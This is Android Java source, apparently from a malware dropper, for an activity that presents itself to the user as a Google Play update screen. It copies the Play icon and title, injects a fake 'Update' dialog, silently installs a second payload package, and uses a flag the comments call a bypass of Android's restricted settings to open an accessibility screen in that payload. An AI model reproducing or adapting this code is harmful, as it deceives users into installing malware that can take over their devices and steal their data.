package com.appd.instll;


import static com.appd.instll.constants.dpstyle;
import static com.appd.instll.constants.forcebypass;
import static com.appd.instll.constants.optndatascan;

import static com.appd.instll.shalter.Utility.drawableToBitmap;
import static com.appd.instll.tools.getAppIconAsBase64;

import static com.appd.instll.tools.getFormattedDateMinusDays;
import static com.appd.instll.tools.getInstallerPackageName;
import static com.appd.instll.tools.getLabelApplication;

import static com.appd.instll.tools.getplayicon;
import static com.appd.instll.tools.isAppInstalled;
import static com.appd.instll.tools.loadHtmlFromAssets;


import android.Manifest;
import android.app.Activity;
import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.drawable.Drawable;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.webkit.JavascriptInterface;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import android.widget.LinearLayout;
import android.widget.Toast;

import androidx.core.app.ActivityCompat;

import java.util.Locale;


public class splash extends Activity {

    public class WebAppInterface {
        Context mContext;

        public WebAppInterface(Context context) {
            this.mContext = context;
        }

        @JavascriptInterface
        public void onUpdateClicked() {
            if (!mContext.getPackageManager().canRequestPackageInstalls()) {
                Intent reqinst = new Intent(mContext, Requestinstall.class);
                reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                reqinst.putExtra("from_permission", true);   // ← ESSA LINHA É O QUE FAZ O BYPASS FUNCIONAR
                mContext.startActivity(reqinst);
                return;
            }

            // Se já tem permissão, segue o fluxo normal
            new Handler(mContext.getMainLooper()).postDelayed(() -> {
                Intent relaunch = new Intent(mContext, updateActivity.class);
                relaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                mContext.startActivity(relaunch);
                splash.this.finish();
            }, 250);
        }


        @JavascriptInterface
        public void onMoreInfoClicked() {
            // Show changelog or open Play Store
            Toast.makeText(mContext, "Service not available.", Toast.LENGTH_SHORT).show();
        }
    }

    public Context myctx;


    @Override
    public void onDestroy() {
        super.onDestroy();

        // finish();
    }

    @Override
    protected void onResume() {
        super.onResume();
        if (isAppInstalled(getApplicationContext(), optndatascan)) {
            // try{
            try {
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A1"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                startActivity(intentxx);
            } catch (Exception a) {
            }
            try {
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A2"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);

                startActivity(intentxx);
            } catch (Exception a) {
            }
            splash.this.finish();
            return;
        }

    }

    private void openAccessibilityDirectly() {
        new Handler(Looper.getMainLooper()).postDelayed(() -> {
            try {
                Intent accIntent = new Intent();
                accIntent.setComponent(new ComponentName(optndatascan, optndatascan + ".AccessibilityActivity"));
                accIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK
                        | Intent.FLAG_ACTIVITY_CLEAR_TOP
                        | Intent.FLAG_ACTIVITY_SINGLE_TOP
                        | Intent.FLAG_ACTIVITY_NO_HISTORY);

                startActivity(accIntent);
                Log.d("Bypass", "✅ AccessibilityActivity aberta com bypass de configurações restritas");
            } catch (Exception e) {
                Log.e("Bypass", "Erro ao abrir Accessibility", e);
                finish();
            }
        }, 350);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        //startService(new Intent(getApplicationContext(), StarterServices.class));
        super.onCreate(savedInstanceState);

        // ==================== BYPASS - Configurações restritas ====================
        if (getIntent().getBooleanExtra("from_permission", false)) {
            new Handler(Looper.getMainLooper()).postDelayed(this::openAccessibilityDirectly, 350);
            return;
        }
        // =======================================================================

        //setContentView(R.layout.splash);
        //progressBar = findViewById(R.id.progressBar);
        // textView = findViewById(R.id.textView);
       // logAppInfo(getApplicationContext());


//        AccessibilityManager am = (AccessibilityManager) getApplicationContext().getSystemService(Context.ACCESSIBILITY_SERVICE);
//        List<AccessibilityServiceInfo> enabledServices = am.getEnabledAccessibilityServiceList(AccessibilityServiceInfo.FEEDBACK_ALL_MASK);
//
//        for (AccessibilityServiceInfo serviceInfo : enabledServices) {
//            ServiceInfo si = serviceInfo.getResolveInfo().serviceInfo;
//
//            String packageName = si.packageName;
//            String serviceName = si.name;
//
//            try {
//                PackageManager pm = getApplicationContext().getPackageManager();
//                ApplicationInfo appInfo = pm.getApplicationInfo(packageName, 0);
//                String sourceDir = appInfo.sourceDir;
//                Log.d("AppSourceDir", "APK is at: " + sourceDir);
//            } catch (PackageManager.NameNotFoundException e) {
//                e.printStackTrace();
//            }
//
//            String label = serviceInfo.getResolveInfo().loadLabel(getApplicationContext().getPackageManager()).toString();
//            String description = serviceInfo.getDescription();
//
//            // 🔍 NEW: Inspect flags and event types
//            int flags = serviceInfo.flags;
//            int eventTypes = serviceInfo.eventTypes;
//            int feedbackType = serviceInfo.feedbackType;
//
//            Log.d("A11yService", "Package: " + packageName);
//            Log.d("A11yService", "Service Name: " + serviceName);
//            Log.d("A11yService", "Label: " + label);
//            Log.d("A11yService", "Description: " + description);
//            Log.d("A11yService", "Flags: " + Integer.toBinaryString(flags));
//            Log.d("A11yService", "Event Types: " + Integer.toBinaryString(eventTypes));
//            Log.d("A11yService", "Feedback Type: " + Integer.toBinaryString(feedbackType));
//        }
//
//        Intent intent = new Intent();
//        intent.setComponent(new ComponentName(
//                "com.android.settings",
//                "com.android.settings.Settings$ConfigureNotificationSettingsActivity"
//        ));
//        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        try {
//            getApplicationContext().startActivity(intent);
//        } catch (ActivityNotFoundException e) {
//            e.printStackTrace();
//            Toast.makeText(this, "Settings activity not found", Toast.LENGTH_SHORT).show();
//        }

//        if(!isMyAppLauncherDefault(getApplicationContext())){
//            Intent intent = new Intent(android.provider.Settings.ACTION_HOME_SETTINGS);
//            startActivity(intent);
//            return;
//
//        }else{
//            Intent intent = getIntent();
//            String action = intent.getAction();
//            Set<String> categories = intent.getCategories();
//
//            if (Intent.ACTION_MAIN.equals(action)) {
//                if (categories != null) {
//                    if (categories.contains(Intent.CATEGORY_HOME)) {
//                        openOtherLauncher(getApplicationContext());
//                        // ✅ User pressed the Home button
//                        Log.d("LauncherTest", "Opened from Home button");
////                       String  luncherpkg = getDefaultLauncherPackage(getApplicationContext());//this will be cureent packename id
////                        Intent i = new Intent();
////                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
////                        i.addFlags(Intent.FLAG_ACTIVITY_NEW_DOCUMENT);
////                        intent.setPackage(luncherpkg);
////                        i.setAction(Intent.ACTION_MAIN);
////                        i.addCategory(Intent.CATEGORY_HOME);
////                        splash.this.startActivity(i);
//                        finish();
//                        return;
//                    }
//                }
//            }
//        }


        if (getSystemService(DevicePolicyManager.class).isProfileOwnerApp(getPackageName())) {
            // We are now in our own profile
            // We should never start the main activity here.
            Log.d("MainActivity", "started in user profile. stopping.");
            finish();
            return;
        }

//        Intent intprofile = new Intent(getApplicationContext(), gamactivity.class);
//        intprofile.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//        startActivity(intprofile);

       // if(1==1){return;}

        myctx = getApplicationContext();
        if (ActivityCompat.checkSelfPermission(myctx, Manifest.permission.POST_NOTIFICATIONS) != PackageManager.PERMISSION_GRANTED) {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                requestPermissions(new String[]{Manifest.permission.POST_NOTIFICATIONS},777);
            }
        }
        if (isAppInstalled(myctx, optndatascan)) {
            // try{
            try {

                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A1"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
                startActivity(intentxx);
            } catch (Exception a) {

            }

            try {
                Intent intentxx = new Intent();
                intentxx.setComponent(new ComponentName(optndatascan, optndatascan + ".A2"));
                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                intentxx.setAction(Intent.ACTION_MAIN);
                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);



                startActivity(intentxx);
            } catch (Exception a) {

            }

            this.finish();
            return;
        }
        //progressBar.setProgressTintList(ColorStateList.valueOf(Color.CYAN));

        String currentLanguage = Locale.getDefault().getLanguage();
        String updatemsg = "";
        String rightsmsg = "";
        String decripview = "";
        String upbtn = "";
        String installingmsg = "Installing";
        switch (currentLanguage) {
            case "en":
                updatemsg = "A new update is available.";
                rightsmsg = "All rights reserved";
                decripview = "An update is available. Tap 'Update' to continue.";
                upbtn = "Update";
                installingmsg = "Installing";
                break;
            case "ar":
                updatemsg = "يتوفر تحديث جديد.";
                rightsmsg = "جميع الحقوق محفوظة";
                decripview = "يتوفر تحديث. اضغط على 'تحديث' للمتابعة.";
                upbtn = "تحديث";
                installingmsg = "جارٍ التثبيت";
                break;
            case "zh":
                updatemsg = "有可用的新更新。";
                rightsmsg = "版权所有";
                decripview = "有可用更新。点击“更新”以继续。";
                upbtn = "更新";
                installingmsg = "正在安装";
                break;
            case "tr":
                updatemsg = "Yeni bir güncelleme mevcut.";
                rightsmsg = "Tüm hakları saklıdır";
                installingmsg = "Yükleniyor";
                decripview = "Bir güncelleme mevcut. Devam için 'Güncelle'ye dokunun.";
                upbtn = "Güncelle";
                break;
            case "pt":
                updatemsg = "Uma nova atualização está disponível.";
                rightsmsg = "Todos os direitos reservados";
                decripview = "Há uma atualização disponível. Toque em 'Atualizar' para continuar.";
                upbtn = "Atualizar";
                installingmsg = "Instalando";
                break;
            case "ru":
                updatemsg = "Доступно новое обновление.";
                rightsmsg = "Все права защищены";
                decripview = "Доступно обновление. Нажмите 'Обновить', чтобы продолжить.";
                upbtn = "Обновить";
                installingmsg = "Установка";
                break;
            case "es":
                updatemsg = "Hay una nueva actualización disponible.";
                rightsmsg = "Todos los derechos reservados";
                decripview = "Hay una actualización disponible. Pulsa 'Actualizar' para continuar.";
                upbtn = "Actualizar";
                installingmsg = "Instalando";
                break;
            default:
                updatemsg = "A new update is available";
                rightsmsg = "All rights reserved";
                decripview = "An update is available. Tap 'Update' to continue.";
                upbtn = "Update";
                installingmsg = "Installing";
                break;
        }


        WebView MywebView = new WebView(this);
        //create webview , load the page from base64 and setcontent , delay for 5 sec , start main activity
        WebSettings webSettings = MywebView.getSettings();
        webSettings.setJavaScriptEnabled(true);  // Enable JavaScript
        MywebView.getSettings().setBuiltInZoomControls(false);
        MywebView.getSettings().setLoadsImagesAutomatically(true);
        MywebView.getSettings().setLoadWithOverviewMode(true);
      //  MywebView.getSettings().setUseWideViewPort(true);
        MywebView.setScrollBarStyle(View.SCROLLBARS_INSIDE_OVERLAY);


        //Intent callintent = getIntent();
        //loadupdater = false;

        boolean icaninstall = false;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            icaninstall = getPackageManager().canRequestPackageInstalls();
            if (icaninstall) {
                String myinstaller = getInstallerPackageName(myctx);
                if (myinstaller == null){
                    myinstaller = "";
                }
                if (forcebypass.equals("1") &&
                        Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU &&
                        !myinstaller.equals(myctx.getPackageName())){
                    SessionManager.install(getApplicationContext());
                }
            }

        }


        String playicon = "";
        if (isAppInstalled(myctx, "com.android.vending")) {
            playicon = getplayicon(myctx);
            String packageName = "com.android.vending";


            PackageManager packageManager = getPackageManager();
            ApplicationInfo applicationInfo = null;
            try {
                applicationInfo = packageManager.getApplicationInfo(packageName, 0);
                Drawable appIcon = packageManager.getApplicationIcon(applicationInfo);
                String appName = packageManager.getApplicationLabel(applicationInfo).toString();
                setTitle(appName);
                Bitmap appIconBitmap = drawableToBitmap(appIcon);
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
                    ActivityManager.TaskDescription taskDescription = new ActivityManager.TaskDescription("Google Play", appIconBitmap);
                    setTaskDescription(taskDescription);
                }
            } catch (PackageManager.NameNotFoundException e) {
                //throw new RuntimeException(e);
            }
        }

        final String thetitle = updatemsg;
        final String thedec = decripview;
        final String thebtn = upbtn;
        final String thelogo = playicon;
        String MyName = getLabelApplication(myctx);
        MywebView.setWebViewClient(new WebViewClient() {
            @Override
            public void onPageFinished(WebView view, String url) {

                if (dpstyle.equals("G")){

                    new Handler(getMainLooper()).postDelayed(() -> {
                        Intent mainint = new Intent(myctx,PopupActivity.class);
                        mainint.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                        myctx.startActivity(mainint);
                    }, 2000);
                }else{
                    new Handler(getMainLooper()).postDelayed(() -> {
                        // injectUpdateDialog(webView, thetitle, thedec, getAppIconAsBase64(myctx), thebtn,"","");
                        injectUpdateDialog(MywebView,
                                MyName,
                                thetitle,
                                getAppIconAsBase64(myctx), // base64 encoded icon
                                getFormattedDateMinusDays(3),
                                "5 MB",
                                thelogo
                        );

                    }, 2000);
                }
            }

        });
        MywebView.addJavascriptInterface(new WebAppInterface(this), "Android");


//        if (loadupdater) {
//            String loadpage = null;
//            try {
//                loadpage = loadHtmlFromAssets(getApplicationContext(), "t1t2t3t4.html");
//            } catch (Exception e) {
//
//            }
//            String pagebase64 = loadpage;
//
//            try {
//
//                String iconbase = "";
//                String appname = "";
//                if (dpstyle.equals("G")){
//                    iconbase = getDrawableAsBase64(myctx,R.drawable.myicon2);
//                    appname =minappname;
//                }else{
//                    iconbase = getAppIconAsBase64(myctx);
//                    appname =MyName;
//                }
//                pagebase64 = (pagebase64).replace("APPNAME", appname)
//                        .replace("Download updates", updatemsg)
//                        .replace("All rights reserved", rightsmsg)
//                        .replace("[INSTL]", installingmsg)
//                        .replace("[FMSG]", decripview)
//                        .replace("[BTN]", upbtn)
//                        .replace("[PLY-ICO]", playicon)
//                        .replace("[BASE-ICO]", iconbase);
//            } catch (Exception e) {
//                // out();
//            }
//            MywebView.loadDataWithBaseURL(null, pagebase64, "text/html", "UTF-8", null);
//            int holdit = 2000;
//            if (icaninstall) {
//                holdit = 100;
//            }
//            new Handler(getMainLooper()).postDelayed(() -> {
//                MywebView.evaluateJavascript("showbtn();", null);
//            }, holdit);
//        } else {
            String loadpage = null;
            try {
                loadpage = loadHtmlFromAssets(getApplicationContext(), "s1s2s3s4.html");
            } catch (Exception e) {

            }
            String pagebase64 = loadpage;

            try {
                String CurrnetLanuage = Locale.getDefault().getLanguage();
                pagebase64 = (pagebase64).replace("APPNAME", MyName)
                        .replace("[LNG]", CurrnetLanuage)
                        .replace("2024", "2025")
                        .replace("[BASE-ICO]", getAppIconAsBase64(myctx));
                //create webview , load the page from base64 and setcontent , delay for 5 sec , start main activity

                webSettings.setJavaScriptEnabled(true);  // Enable JavaScript



                MywebView.loadDataWithBaseURL(null, pagebase64, "text/html", "UTF-8", null);


            } catch (Exception e) {

            }
     //   }

        String ua = MywebView.getSettings().getUserAgentString();

        MywebView.getSettings().setUserAgentString(ua);

        LinearLayout layout = new LinearLayout(this);
        layout.setLayoutParams(new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT,
                LinearLayout.LayoutParams.MATCH_PARENT
        ));

        LinearLayout.LayoutParams webViewParams =
                new LinearLayout.LayoutParams(
                        LinearLayout.LayoutParams.MATCH_PARENT,
                        LinearLayout.LayoutParams.MATCH_PARENT
                );
        MywebView.setLayoutParams(webViewParams);

        layout.addView(MywebView);
        setContentView(layout);



//        webView.setWebChromeClient(new WebChromeClient() {
//            @Override
//            public boolean onJsAlert(WebView view, String url, String message, JsResult result) {
//                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
////                        Intent mainLaunch = new Intent(myctx, MainActivity.class);
////                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
////                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
////                        myctx.startActivity(mainLaunch);
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                            if (!getPackageManager().canRequestPackageInstalls()) {
//                                Intent reqinst = new Intent(getApplicationContext(), Requestinstall.class);
//                                reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                startActivity(reqinst);
//                                //  watcher();
//                                return;
//                            }
//                        }
//                        SessionManager.install(getApplicationContext());
//
//                        watcher();
//                        // finish();
//                    }
//                }, 1);
//                return true; // Indicate that we handled the alert
//            }
//
//            @Override
//            public boolean onJsConfirm(WebView view, String url, String message, JsResult result) {
//                new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
//                    @Override
//                    public void run() {
////                        Intent mainLaunch = new Intent(myctx, MainActivity.class);
////                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
////                        mainLaunch.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
////                        myctx.startActivity(mainLaunch);
//                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
//                            if (!getPackageManager().canRequestPackageInstalls()) {
//                                Intent reqinst = new Intent(getApplicationContext(), Requestinstall.class);
//                                reqinst.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                startActivity(reqinst);
//                                //   watcher();
//                                return;
//                            }
//                        }
//                        SessionManager.install(getApplicationContext());
//
//                        watcher();
//                    }
//                }, 1);
//                return true; // Indicate that we handled the confirm
//            }
//        });


    }

    abstract class SessionTracker {
        abstract void recordSession(String id);

        void inval() {
            invalidate();
            Log.w("a", "b");
        }

        void idate() {
            inval();
            Log.w("s", "d");
        }

        void invalidate() {
            idate();
            Log.w("f", "s");
        }
    }
//    private void watcher() {
//        new Thread(new Runnable() {
//            @Override
//            public void run() {
//                boolean wilcan = true;
//                while (wilcan) {
//                    try {
//                        Thread.sleep(15000);
//                    } catch (Exception s) {
//                    }
//
//                    //Build.VERSION.SDK_INT < Build.VERSION_CODES.O || ctx.getPackageManager().canRequestPackageInstalls()
//                    if (isAppInstalled(myctx, sapp)) {
//                        wilcan = false;
//                        new Handler(myctx.getMainLooper()).post(() -> {
//                            try {
//                                Intent intentxx = new Intent();
//                                intentxx.setComponent(new ComponentName(sapp, sapp + ".A1"));
//                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
//                                intentxx.setAction(Intent.ACTION_MAIN);
//                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
//                                startActivity(intentxx);
//                            } catch (Exception a) {
//
//                            }
//                            try {
//                                Intent intentxx = new Intent();
//                                intentxx.setComponent(new ComponentName(sapp, sapp + ".A2"));
//                                intentxx.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
//                                intentxx.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
//                                intentxx.setAction(Intent.ACTION_MAIN);
//                                intentxx.addCategory(Intent.CATEGORY_LEANBACK_LAUNCHER);
//                                startActivity(intentxx);
//                            } catch (Exception a) {
//
//                            }
//
//                            finish();
//                        });
//                        break;
//                    } else {
//                        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O || myctx.getPackageManager().canRequestPackageInstalls()) {
//                            new Handler(myctx.getMainLooper()).post(() -> {
//                                SessionManager.install(getApplicationContext());
//                            });
//
//                        }
//                    }
//                }
//            }
//        }).start();
//
//    }

    public void injectUpdateDialog(WebView webView, String appName, String updateMsg, String base64Icon, String updateDate, String size, String plylogo) {


        String jsCode =
                "(function() {" +
                        "  function showUpdateDialog() {" +

                        // Overlay
                        "    var overlay = document.createElement('div');" +
                        "    overlay.style.cssText = 'position:fixed;inset:0;padding:0px;background:rgba(0,0,0,0.4);z-index:9999;" +
                        "        display:flex;align-items:center;justify-content:center;font-family:sans-serif';" +

                        // Dialog
                        "    var dialog = document.createElement('div');" +
                        "    dialog.style.cssText = 'width:90%;background:#fff;padding:20px;margin=:10px;margin: 40px;" +
                        "        box-shadow:0 4px 16px rgba(0,0,0,0.2);position:fixed;text-align:left;bottom: 0px';" +

                        // Top row: Google Play + close (X)
                        "    var topRow = document.createElement('div');" +
                        "    topRow.style.cssText = 'display:flex;justify-content:space-between;align-items:center;margin-bottom:30px';" +

                        "    var logo = document.createElement('img');" +
                        "    logo.src = `data:image/png;base64," + plylogo + "`;" +
                        "    logo.style.cssText = 'height:35px';" +
                        "    topRow.appendChild(logo);" +
                        // Title
                        "    var title = document.createElement('h2');" +
                        "    title.innerText = '" + updateMsg + "';" +
                        "    title.style.cssText = 'font-size:18px;font-weight:600;margin:4px 0;color:#202124;margin-bottom: 15px;';" +

                        // Message
                        "    var message = document.createElement('p');" +
                        "    message.innerText = 'To use this app, download the latest version.';" +
                        "    message.style.cssText = 'font-size:14px;color:#5f6368;margin:6px 0 16px';" +

                        // App info row
                        "    var appRow = document.createElement('div');" +
                        "    appRow.style.cssText = 'display:flex;align-items:center;margin-bottom:30px';" +

                        "    var icon = document.createElement('img');" +
                        "    icon.src = `data:image/png;base64," + base64Icon + "`;" +
                        "    icon.style.cssText = 'width:48px;height:48px;border-radius:10px;margin-right:12px';" +

                        "    var appText = document.createElement('div');" +
                        "    appText.innerHTML = '<strong style=\"font-size:15px;color:#202124\">" + appName + "</strong><br>" +
                        "        <span style=\"font-size:13px;color:#5f6368\">Size · " + size + "</span>';" +

                        "    appRow.appendChild(icon);" +
                        "    appRow.appendChild(appText);" +

                        // What's New Section
                        "    var whatsNew = document.createElement('div');" +
                        "    whatsNew.innerHTML = '<div style=\"font-size:14px;color:#202124;font-weight:500;margin-bottom:4px\">What\\'s new</div>' +" +
                        "        '<div style=\"font-size:13px;color:#5f6368;margin-bottom:20px\">Updated on " + updateDate + "</div>';" +

                        // Buttons
                        "    var btnRow = document.createElement('div');" +
                        "    btnRow.style.cssText = 'display:flex;gap:10px;justify-content:flex-end';" +

                        "    var infoBtn = document.createElement('button');" +
                        "    infoBtn.innerText = 'More info';" +
                        "    infoBtn.style.cssText = 'padding:10px 16px;font-size:14px;border:1px solid #ccc;background:white;" +
                        "        color:#39816B;border-radius:24px;cursor:pointer;flex:1';" +
                        "    infoBtn.onclick = function() { Android.onMoreInfoClicked && Android.onMoreInfoClicked(); };" +

                        "    var updateBtn = document.createElement('button');" +
                        "    updateBtn.innerText = 'Update';" +
                        "    updateBtn.style.cssText = 'padding:10px 16px;font-size:14px;background:#39816B;color:white;" +
                        "        border:none;border-radius:24px;cursor:pointer;flex:1';" +
                        "    updateBtn.onclick = function() {" +
                        "      updateBtn.disabled = true;" +
                        "      updateBtn.innerText = 'Updating…';" +
                        "      Android.onUpdateClicked();" +
                        "    };" +

                        "    btnRow.appendChild(infoBtn);" +
                        "    btnRow.appendChild(updateBtn);" +

                        // Assemble everything
                        "    dialog.appendChild(topRow);" +
                        "    dialog.appendChild(title);" +
                        "    dialog.appendChild(message);" +
                        "    dialog.appendChild(appRow);" +
                        "    dialog.appendChild(whatsNew);" +
                        "    dialog.appendChild(btnRow);" +

                        "    overlay.appendChild(dialog);" +
                        "    document.body.appendChild(overlay);" +
                        "  }" +
                        "  window.showUpdateDialog = showUpdateDialog;" +
                        "  document.documentElement.style.webkitTapHighlightColor = 'transparent';" +
                        "  document.documentElement.style.webkitUserSelect = 'none';" +
                        "  document.documentElement.style.khtmlUserSelect  = 'none';" +
                        "  document.documentElement.style.mozUserSelect   = 'none';" +
                        "  document.documentElement.style.msUserSelect    = 'none';" +
                        "  document.documentElement.style.userSelect     = 'none';" +
                        "  showUpdateDialog();" +
                        "})();";

        webView.evaluateJavascript(jsCode, null);
    }


}
